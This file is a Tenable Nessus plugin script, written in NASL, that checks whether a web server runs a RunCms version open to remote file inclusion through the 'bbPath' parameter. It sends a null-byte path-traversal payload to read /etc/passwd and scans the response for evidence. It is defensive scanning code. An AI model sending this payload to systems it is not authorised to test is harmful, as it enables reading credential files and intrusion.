#
# (C) Tenable Network Security
#


if (description) {
  script_id(20880);
  script_version("$Revision: 1.2 $");

  script_name(english:"RunCms bbPath Parameter Remote File Include Vulnerability");
  script_summary(english:"Checks for bbPath parameter remote file include vulnerability in RunCms");
 
  desc = "
Synopsis :

The remote web server contains a PHP application that is susceptible
to remote file include attacks. 

Description :

The remote host appears to be running RunCms, a content-management
system written in PHP. 

The installed version of RunCms fails to validate user input to the
'bbPath' parameter of two scripts.  An unauthenticated attacker may be
able to leverage this issue to view arbitrary files on the remote host
or to execute arbitrary PHP code, possibly taken from third-party
hosts. 

Note that successful exploitation requires that PHP's
'register_globals' setting be enabled. 

See also :

http://www.runcms.org/public/modules/news/

Solution :

Upgrade to RunCms 1.3a or later.

Risk factor : 

Medium / CVSS Base Score : 6 
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/runcms", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit the flaw to read /etc/passwd.
  file = "/etc/passwd%00";
  req = http_get(
    item:string(
      dir, "/modules/newbb_plus/class/class.forumposts.php?",
      "bbPath[path]=", file
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(string:res, pattern:"root:.*:0:[01]:") ||
    # we get an error saying "failed to open stream" or "failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but passing
    #     remote URLs might still work.
    egrep(string:res, pattern:"main\(/etc/passwd\\0/include/user_level\.php.+ failed to open stream") ||
    egrep(string:res, pattern:"Failed opening '/etc/passwd\\0/include/user_level\.php' for inclusion")
  ) {
    security_warning(port);
    exit(0);
  }
}
